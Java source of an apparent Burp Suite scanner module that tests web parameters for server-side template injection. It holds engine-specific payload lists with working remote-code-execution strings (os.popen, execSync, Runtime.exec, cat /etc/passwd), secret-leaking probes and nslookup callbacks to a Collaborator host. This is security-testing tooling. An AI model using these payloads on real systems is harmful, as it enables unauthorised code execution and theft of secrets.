package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 6: Comprehensive SSTI Scanner
 * Detects Server-Side Template Injection across multiple template engines.
 * Uses polyglot probes, engine-specific payloads, and reflection context detection.
 */
public class SstiScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();

    // Polyglot probe payloads and their expected results
    // Use large unique numbers (e.g., 133*991=131803) to avoid matching natural page content.
    // "49" from 7*7 matches page numbers, dates, etc. "131803" is extremely unlikely in normal HTML.
    private static final String SSTI_EXPECTED = "131803";
    private static final String[][] POLYGLOT_PROBES = {
            // payload, expectedResult, description
            {"{{133*991}}", SSTI_EXPECTED, "Jinja2/Twig/Angular"},
            {"${133*991}", SSTI_EXPECTED, "Freemarker/Mako/EL"},
            {"<%= 133*991 %>", SSTI_EXPECTED, "ERB (Ruby)"},
            {"#{133*991}", SSTI_EXPECTED, "Pug/Jade/Thymeleaf"},
            {"{133*991}", SSTI_EXPECTED, "Smarty/Velocity"},
            {"{{133*'991'}}", "", "Jinja2 (string multiplication)"},  // String repeat produces huge output, not reliable
            {"{{'133'*991}}", "", "Twig (string repeat)"},
            {"#set($x=133*991)${x}", SSTI_EXPECTED, "Velocity"},
            {"[[${133*991}]]", SSTI_EXPECTED, "Thymeleaf inline"},
            {"{{= 133*991}}", SSTI_EXPECTED, "doT.js"},
            {"<#assign x=133*991>${x}", SSTI_EXPECTED, "Freemarker assign"},
            {"${T(java.lang.Math).random()}", "", "Spring EL (any numeric output)"},
            {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty (if conditional)"},
            {"@(133*991)", SSTI_EXPECTED, "Razor (.NET)"},
            {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
            {"<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}", "uid=", "Freemarker assign RCE"},
            {"${{133*991}}", SSTI_EXPECTED, "Combined Jinja2/Freemarker"},
            {"{{constructor.constructor('return 133*991')()}}", SSTI_EXPECTED, "Prototype pollution eval"},
            {"{{range.constructor('return 133*991')()}}", SSTI_EXPECTED, "Nunjucks/Handlebars range constructor"},
            {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP block (legacy)"},
            {"{%set x=133*991%}{{x}}", SSTI_EXPECTED, "Jinja2 set tag"},
            {"${131000+803}", SSTI_EXPECTED, "Spring EL addition"},
            {"<%= 133.*(991) %>", SSTI_EXPECTED, "ERB method call"},
            {"p #{133*991}", SSTI_EXPECTED, "Slim template (Ruby)"},
            {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid template eval"},
            {"@(133 * 991)", SSTI_EXPECTED, "Razor (with spaces)"},
    };

    // Universal polyglot that triggers errors in most engines
    private static final String POLYGLOT_ERROR = "${{<%[%'\"}}%\\.";

    // Engine identification payloads (safe mode - math only)
    private static final Map<String, String[][]> ENGINE_PROBES = new LinkedHashMap<>();

    static {
        ENGINE_PROBES.put("Jinja2", new String[][]{
                {"{{config}}", "SECRET_KEY|DEBUG|TESTING", "Flask config access"},
                {"{{self.__class__}}", "TemplateReference|Undefined", "Jinja2 class"},
                {"{{request.environ}}", "SERVER_NAME|wsgi", "Flask request object"},
                {"{{[].__class__.__base__.__subclasses__()}}", "subprocess|Popen|Warning", "Python MRO"},
                {"{{lipsum.__globals__}}", "os|builtins", "Jinja2 lipsum globals"},
                {"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 RCE via cycler (AGGRESSIVE)"},
                {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "subprocess|Popen|Warning", "Jinja2 attr+hex filter bypass"},
                {"{{().__class__.__mro__[1].__subclasses__()}}", "subprocess|Popen|Warning", "Jinja2 MRO via hex escape"},
        });
        ENGINE_PROBES.put("Twig", new String[][]{
                {"{{_self.env.getFilter('id')}}", "Twig", "Twig self reference"},
                {"{{'omnistrike_ssti_confirm'|upper}}", "OMNISTRIKE_SSTI_CONFIRM", "Twig filter"},
                {"{{'133'*7}}", "133133133133133133133", "Twig string repeat"},
                {"{{_self.env.getRuntimeLoader()}}", "Twig|Runtime", "Twig runtime loader"},
                {"{{dump(app)}}", "AppVariable|kernel", "Symfony app dump"},
                {"{{['id']|filter('system')}}", "uid=", "Twig RCE (AGGRESSIVE)"},
                {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
                {"{{'omnistrike'|reduce((a,b)=>a~b)}}", "omnistrike", "Twig reduce filter"},
        });
        ENGINE_PROBES.put("Freemarker", new String[][]{
                {"${.version}", "2.", "Freemarker version"},
                {"${133*991}", SSTI_EXPECTED, "Freemarker eval"},
                {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "ObjectConstructor", "Freemarker OC"},
                {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Velocity", new String[][]{
                {"#set($x=133*991)$x", SSTI_EXPECTED, "Velocity set"},
                {"$class.inspect('java.lang.Runtime')", "Runtime", "Velocity reflection"},
                {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "Process", "Velocity RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Thymeleaf", new String[][]{
                {"__${133*991}__", SSTI_EXPECTED, "Thymeleaf preprocessor"},
                {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "Process", "Thymeleaf RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Mako", new String[][]{
                {"${133*991}", SSTI_EXPECTED, "Mako eval"},
                {"${self.module.__builtins__}", "builtins", "Mako builtins access"},
                {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("ERB", new String[][]{
                {"<%= 133*991 %>", SSTI_EXPECTED, "ERB eval"},
                {"<%= Dir.entries('/') %>", "[", "ERB dir listing"},
                {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Pug", new String[][]{
                {"#{133*991}", SSTI_EXPECTED, "Pug eval"},
                {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Handlebars", new String[][]{
                {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "function", "Handlebars constructor lookup"},
                {"{{#if true}}omnistrike_hbs_confirmed{{/if}}", "omnistrike_hbs_confirmed", "Handlebars if helper"},
                {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('id')\")}}{{/with}}{{/with}}", "uid=", "Handlebars RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Smarty", new String[][]{
                {"{math equation=\"133*991\"}", SSTI_EXPECTED, "Smarty math"},
                {"{$smarty.version}", "3.|4.|5.", "Smarty version leak"},
                {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty if conditional"},
                {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP tags (deprecated in v3+)"},
                {"{if phpinfo()}{/if}", "PHP Version", "Smarty phpinfo (AGGRESSIVE)"},
                {"{system('id')}", "uid=", "Smarty RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("doT.js", new String[][]{
                {"{{= 133*991}}", SSTI_EXPECTED, "doT.js eval"},
                {"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Nunjucks", new String[][]{
                {"{{133*991}}", SSTI_EXPECTED, "Nunjucks eval"},
                {"{{range.constructor(\"return 133*991\")()}}", SSTI_EXPECTED, "Nunjucks constructor eval"},
                {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Django", new String[][]{
                {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
                {"{{settings.SECRET_KEY}}", "", "Django SECRET_KEY leak (any non-empty output)"},
                {"{% load log %}{% get_admin_log 10 as log %}{{log}}", "QuerySet|LogEntry", "Django admin log"},
                {"{% include 'admin/base.html' %}", "Django|admin|doctype", "Django template include"},
        });
        ENGINE_PROBES.put("Razor", new String[][]{
                {"@(133*991)", SSTI_EXPECTED, "Razor eval"},
                {"@DateTime.Now", "20", "Razor DateTime (year prefix)"},
                {"@System.IO.Directory.GetCurrentDirectory()", "/|C:\\", "Razor directory listing"},
                {"@System.Diagnostics.Process.Start(\"id\")", "Process", "Razor RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("EJS", new String[][]{
                {"<%= 133*991 %>", SSTI_EXPECTED, "EJS eval"},
                {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Mustache", new String[][]{
                {"{{#list}}test{{/list}}", "test|list", "Mustache section"},
        });
        ENGINE_PROBES.put("Liquid", new String[][]{
                {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid filter"},
                {"{{ 'omnistrike' | upcase }}", "OMNISTRIKE", "Liquid upcase filter"},
                {"{% assign x = 133 %}{{ x | times: 991 }}", SSTI_EXPECTED, "Liquid assign + filter"},
        });
        ENGINE_PROBES.put("Blade", new String[][]{
                {"{{ 133*991 }}", SSTI_EXPECTED, "Laravel Blade double curly"},
                {"{!! 133*991 !!}", SSTI_EXPECTED, "Blade unescaped output"},
                {"@php echo 133*991; @endphp", SSTI_EXPECTED, "Blade PHP block (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Plates", new String[][]{
                {"<?= 133*991 ?>", SSTI_EXPECTED, "Plates short echo"},
                {"<?= $this->e('omnistrike_confirm') ?>", "omnistrike_confirm", "Plates escape helper"},
        });
        ENGINE_PROBES.put("Groovy", new String[][]{
                {"${133*991}", SSTI_EXPECTED, "Groovy GString"},
                {"<% println 133*991 %>", SSTI_EXPECTED, "Groovy template"},
                {"${\"cat /etc/passwd\".execute().text}", "root:", "Groovy RCE (AGGRESSIVE)"},
        });
    }

    // Error patterns that indicate template engine presence
    private static final Map<String, Pattern> ENGINE_ERROR_PATTERNS = Map.ofEntries(
            Map.entry("Jinja2", Pattern.compile("jinja2\\.exceptions|UndefinedError|TemplateSyntaxError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Twig", Pattern.compile("Twig_Error|Twig\\\\Error|twig\\.error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Freemarker", Pattern.compile("freemarker\\.core|FreeMarker|ParseException.*freemarker", Pattern.CASE_INSENSITIVE)),
            Map.entry("Velocity", Pattern.compile("org\\.apache\\.velocity|VelocityException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Thymeleaf", Pattern.compile("org\\.thymeleaf|ThymeleafView|TemplateProcessingException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mako", Pattern.compile("mako\\.exceptions|MakoException", Pattern.CASE_INSENSITIVE)),
            Map.entry("ERB", Pattern.compile("ActionView::Template::Error|ERB::Util", Pattern.CASE_INSENSITIVE)),
            Map.entry("Smarty", Pattern.compile("Smarty[_ ]error|SmartyException|Smarty_Internal", Pattern.CASE_INSENSITIVE)),
            Map.entry("Pug", Pattern.compile("PugException|pug_error|unexpected token", Pattern.CASE_INSENSITIVE)),
            Map.entry("Django", Pattern.compile("TemplateSyntaxError|django\\.template", Pattern.CASE_INSENSITIVE)),
            Map.entry("Razor", Pattern.compile("RazorEngine|System\\.Web\\.Mvc|CompilationError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Handlebars", Pattern.compile("Handlebars\\.Exception|handlebars.*error|Missing helper|Parse error", Pattern.CASE_INSENSITIVE)),
            Map.entry("EJS", Pattern.compile("ejs.*error|EJS.*compile|ReferenceError.*ejs", Pattern.CASE_INSENSITIVE)),
            Map.entry("Nunjucks", Pattern.compile("nunjucks.*error|Template render error.*nunjucks", Pattern.CASE_INSENSITIVE)),
            Map.entry("doT.js", Pattern.compile("doT\\.template|doT.*error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mustache", Pattern.compile("Mustache.*error|Missing.*tag|Unclosed.*section", Pattern.CASE_INSENSITIVE)),
            Map.entry("Liquid", Pattern.compile("Liquid.*error|Liquid::SyntaxError|Unknown tag", Pattern.CASE_INSENSITIVE)),
            Map.entry("Blade", Pattern.compile("Blade.*error|View.*not found|Undefined variable", Pattern.CASE_INSENSITIVE)),
            Map.entry("Groovy", Pattern.compile("groovy\\.lang|GroovyRuntimeException|MissingMethodException", Pattern.CASE_INSENSITIVE))
    );

    // OOB SSTI payloads for Collaborator-based blind detection
    private static final String[][] OOB_SSTI_PAYLOADS = {
        // Jinja2 / Python
        {"{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (nslookup)"},
        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subprocess)"},
        {"${__import__('os').popen('nslookup COLLAB_PLACEHOLDER').read()}", "Mako OOB (nslookup)"},
        // Twig / PHP
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('system')}}", "Twig OOB (system)"},
        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system)"},
        // Freemarker / Java
        {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup COLLAB_PLACEHOLDER\")}", "Freemarker OOB (Execute)"},
        {"${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}", "Spring EL OOB"},
        {"__${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}__", "Thymeleaf OOB"},
        // ERB / Ruby
        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick)"},
        {"<%= system('nslookup COLLAB_PLACEHOLDER') %>", "ERB OOB (system)"},
        // Pug / Node.js
        {"#{root.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}", "Pug OOB"},
        // Velocity / Java
        {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('nslookup COLLAB_PLACEHOLDER')", "Velocity OOB"},
        // Smarty / PHP
        {"{if system('nslookup COLLAB_PLACEHOLDER')}{/if}", "Smarty OOB (if system)"},
        // Nunjucks / Node.js
        {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")()}}", "Nunjucks OOB"},
        // Razor / .NET
        {"@System.Diagnostics.Process.Start(\"nslookup\",\"COLLAB_PLACEHOLDER\")", "Razor OOB"},
        // doT.js / Node.js
        {"{{= global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') }}", "doT.js OOB"},
        // Handlebars / Node.js
        {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")}}{{/with}}{{/with}}", "Handlebars OOB (constructor)"},
        // EJS / Node.js
        {"<%= process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (execSync)"},
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (require)"},
        // Django / Python (limited — Django templates are sandboxed, but custom template tags or debug mode may allow execution)
        {"{% load log %}{% get_admin_log 10 as entries %}{% for e in entries %}{{e}}{% endfor %}", "Django OOB (admin log exfil)"},
        // Additional Jinja2 OOB variants
        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subclass 287)"},
        {"{{lipsum.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (lipsum globals)"},
        {"{{cycler.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (cycler)"},
        {"{{joiner.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (joiner)"},
        {"{{namespace.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (namespace)"},
        // Additional Smarty OOB variants
        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system direct)"},
        {"{Smarty_Internal_Write_File::writeFile('/tmp/x','test',self::clearConfig())}", "Smarty OOB (file write)"},
        // Additional Twig OOB variants
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('exec')}}", "Twig OOB (exec filter)"},
        // Additional ERB OOB variants
        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick alt)"},
        // Groovy OOB
        {"${\"nslookup COLLAB_PLACEHOLDER\".execute()}", "Groovy OOB (execute)"},
        // Additional EJS OOB variants
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString() %>", "EJS OOB (toString)"},
        // Pug OOB variants
        {"#{require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()}", "Pug OOB (toString)"},
    };

    @Override
    public String getId() { return "ssti-scanner"; }

    @Override
    public String getName() { return "SSTI Scanner"; }

    @Override
    public String getDescription() {
        return "Comprehensive Server-Side Template Injection detection across 12+ template engines.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore, CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        return runSstiTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        return runSstiTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runSstiTargets(HttpRequestResponse requestResponse,
                                          List<InjectionTarget> targets, String urlPath) {
        for (InjectionTarget target : targets) {
            if (!dedup.markIfNew("ssti-scanner", urlPath, target.name)) continue;

            try {
                testSsti(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("SSTI test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testSsti(HttpRequestResponse original, InjectionTarget target) throws InterruptedException {
        String url = original.request().url();
        boolean aggressiveMode = config.getBool("ssti.aggressive", false);

        // Step 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
        // Send all engine OOB payloads unconditionally (engine=null → sends all)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOobSsti(original, target, null);
        }

        // Get baseline response
        if (oobConfirmedParams.contains(target.name)) return;
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        if (baseline == null || baseline.response() == null) return;
        String baselineBody = baseline.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Step 2: Error-triggering polyglot
        boolean polyglotCaused500 = false;

        HttpRequestResponse errorResult = sendPayload(original, target, POLYGLOT_ERROR);
        if (errorResult != null && errorResult.response() != null) {
            String errorBody = errorResult.response().bodyToString();
            int errorStatus = errorResult.response().statusCode();

            // Check for template engine error messages
            for (Map.Entry<String, Pattern> entry : ENGINE_ERROR_PATTERNS.entrySet()) {
                if (entry.getValue().matcher(errorBody).find() && !entry.getValue().matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("ssti-scanner",
                                    "SSTI Indicator: " + entry.getKey() + " error triggered",
                                    Severity.LOW, Confidence.TENTATIVE)
                            .url(url).parameter(target.name)
                            .evidence("Engine: " + entry.getKey() + " | Polyglot triggered error response (status " + errorStatus + ")")
                            .description("Template engine error detected. Input may reach a " + entry.getKey() + " template.")
                            .requestResponse(errorResult)
                            .payload(POLYGLOT_ERROR)
                            .build());
                }
            }

            // A 500 from the polyglot is NOT reported as a finding — malformed input in cookies,
            // query params, or headers commonly triggers 500s for reasons unrelated to template rendering
            // (input validation, WAF rejection, deserialization errors, etc.). However, we still use it
            // to gate OOB testing below, since OOB only confirms if Collaborator actually gets a callback.
            if (errorStatus == 500 && baseline.response().statusCode() != 500) {
                polyglotCaused500 = true;
            }
        }

        // Step 3: Math evaluation probes
        if (oobConfirmedParams.contains(target.name)) return;
        boolean templateConfirmed = false;
        String confirmedEngine = null;

        for (String[] probe : POLYGLOT_PROBES) {
            String payload = probe[0];
            String expected = probe[1];
            String engineHint = probe[2];

    
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses — template evaluation should produce a 200, not a 4xx/5xx
            int responseStatus = result.response().statusCode();
            if (responseStatus >= 400) continue;

            String responseBody = result.response().bodyToString();

            // Special case: Spring EL returns random number
            if (payload.contains("T(java.lang.Math).random()")) {
                if (Pattern.compile("0\\.\\d{10,}").matcher(responseBody).find()
                        && !Pattern.compile("0\\.\\d{10,}").matcher(baselineBody).find()) {
                    templateConfirmed = true;
                    confirmedEngine = "Spring EL";
                    findingsStore.addFinding(Finding.builder("ssti-scanner",
                                    "SSTI Confirmed: Spring Expression Language",
                                    Severity.HIGH, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + payload + " | Random number appeared in response")
                            .description("Spring EL injection confirmed via Math.random() execution.")
                            .requestResponse(result)
                            .payload(payload)
                            .build());
                    break;
                }
                continue;
            }

            // Check if expected result appears in response but NOT in baseline
            // Support OR matching: "A|B|C" means any of A, B, C must be found
            // Guard: if baseline is empty, skip math-result checks (e.g., "49") to avoid FPs
            boolean expectedFound = false;
            if (!expected.isEmpty()) {
                boolean baselineEmpty = baselineBody.isEmpty();
                if (expected.contains("|")) {
                    for (String exp : expected.split("\\|")) {
                        String trimmed = exp.trim();
                        if (baselineEmpty && trimmed.matches("\\d+")) continue; // Skip numeric matches on empty baseline
                        if (responseBody.contains(trimmed) && !baselineBody.contains(trimmed)) {
                            expectedFound = true;
                            break;
                        }
                    }
                } else {
                    if (baselineEmpty && expected.matches("\\d+")) {
                        // Don't trust numeric matches (like "49") when baseline is empty
                        expectedFound = false;
                    } else {
                        expectedFound = responseBody.contains(expected) && !baselineBody.contains(expected);
                    }
                }
            }
            if (expectedFound) {
                // Verify template syntax was consumed — if the raw payload appears verbatim
                // in the response, the server is just reflecting input, not evaluating it.
                // The expected value may coincidentally exist elsewhere on the page.
                boolean syntaxConsumed = !responseBody.contains(payload);
                if (!syntaxConsumed) continue;  // Raw payload reflected = not evaluated

                // Additional check: the expected value must not be a substring of the payload
                // (e.g., if payload is "{{131803}}" and expected is "131803", the server might
                // just be stripping the braces). Verify result appears in a different context.
                // Skip if expected appears ONLY adjacent to remnants of the payload syntax.

                templateConfirmed = true;

                findingsStore.addFinding(Finding.builder("ssti-scanner",
                                "SSTI Detected: " + engineHint + " template evaluation",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Expected: " + expected
                                + " found in response (template syntax consumed)")
                        .description("Template expression was evaluated — the template syntax was consumed "
                                + "and replaced with the computed result. Engine hint: " + engineHint)
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(expected)
                        .build());
                break;
            }

            perHostDelay();
        }

        // Step 4: Engine identification (if template evaluation confirmed)
        if (oobConfirmedParams.contains(target.name)) return;
        String identifiedEngine = null;
        if (templateConfirmed) {
            identifiedEngine = identifyEngine(original, target, baselineBody, aggressiveMode);
        }

        // Step 5: Targeted OOB for identified engine (refines the initial blanket OOB from Step 1)
        if (oobConfirmedParams.contains(target.name)) return;
        if (identifiedEngine != null && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOobSsti(original, target, identifiedEngine);
        }
    }

    private String identifyEngine(HttpRequestResponse original, InjectionTarget target,
                                    String baselineBody, boolean aggressiveMode) {
        String url = original.request().url();

        for (Map.Entry<String, String[][]> engineEntry : ENGINE_PROBES.entrySet()) {
            String engine = engineEntry.getKey();
            String[][] probes = engineEntry.getValue();

            for (String[] probe : probes) {
                String payload = probe[0];
                String expected = probe[1];
                String desc = probe[2];

                // Skip aggressive payloads unless aggressive mode is enabled
                if (desc.contains("AGGRESSIVE") && !aggressiveMode) continue;

                try {
            
                    HttpRequestResponse result = sendPayload(original, target, payload);
                    if (result == null || result.response() == null) continue;

                    String body = result.response().bodyToString();

                    // Check for expected output
                    boolean matched = false;
                    if (expected.contains("|")) {
                        // Multiple possible matches (OR)
                        for (String exp : expected.split("\\|")) {
                            if (body.contains(exp.trim()) && !baselineBody.contains(exp.trim())) {
                                matched = true;
                                break;
                            }
                        }
                    } else {
                        matched = body.contains(expected) && !baselineBody.contains(expected);
                    }

                    if (matched) {
                        // Verify template syntax was consumed (not just reflected)
                        // Skip this check for RCE payloads (they confirm via command output, not math)
                        if (!desc.contains("RCE") && !desc.contains("version") && !desc.contains("config")
                                && !desc.contains("class") && !desc.contains("globals")
                                && body.contains(payload)) {
                            continue;  // Raw payload reflected = not evaluated
                        }

                        Severity severity = desc.contains("RCE") ? Severity.CRITICAL : Severity.HIGH;
                        Confidence confidence = Confidence.CERTAIN;

                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Engine Identified: " + engine + " - " + desc,
                                        severity, confidence)
                                .url(url).parameter(target.name)
                                .evidence("Payload: " + payload + " | Expected '" + expected + "' found")
                                .description("Template engine positively identified as " + engine
                                        + ". " + desc + ".")
                                .requestResponse(result)
                                .payload(payload)
                                .responseEvidence(expected)
                                .build());
                        return engine; // Engine identified, done
                    }

                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            }
        }
        return null;
    }

    private void testOobSsti(HttpRequestResponse original, InjectionTarget target, String identifiedEngine) {
        String url = original.request().url();
        for (String[] payloadInfo : OOB_SSTI_PAYLOADS) {
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];

            // If engine was identified, only send OOB payloads for that engine and related engines
            if (identifiedEngine != null) {
                String techLower = technique.toLowerCase();
                String engineLower = identifiedEngine.toLowerCase();
                // Use word-boundary match to avoid substring false positives
                // (e.g., engine "EL" matching "mod*el*" in an unrelated technique)
                boolean match = techLower.matches(".*\\b" + Pattern.quote(engineLower) + "\\b.*");
                // Thymeleaf uses Spring EL, so include Spring EL payloads when Thymeleaf is detected
                if (!match && engineLower.contains("thymeleaf")) {
                    match = techLower.contains("spring el");
                }
                // Spring EL apps often use Thymeleaf as the view layer
                if (!match && engineLower.contains("spring")) {
                    match = techLower.contains("thymeleaf");
                }
                if (!match) continue;
            }

            // AtomicReference to capture the sent request/response for the finding
            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();

            String collabPayload = collaboratorManager.generatePayload(
                    "ssti-scanner", url, target.name,
                    "SSTI OOB " + technique,
                    interaction -> {
                        // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                        // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                        // wait is almost always enough for the sending thread to complete its set() call.
                        for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                        }
                        // Mark parameter as confirmed — skip all remaining phases
                        oobConfirmedParams.add(target.name);
                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Confirmed (Out-of-Band) - " + technique,
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Server-Side Template Injection confirmed via Burp Collaborator. "
                                        + "The template engine executed the injected command, triggering a "
                                        + interaction.type().name() + " callback.")
                                .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                                .payload(payloadTemplate)
                                .build());
                        api.logging().logToOutput("[SSTI OOB] Confirmed! " + technique
                                + " at " + url + " param=" + target.name);
                    }
            );

            if (collabPayload == null) continue;
            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

            try {
                sentRequest.set(sendPayload(original, target, payload));
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

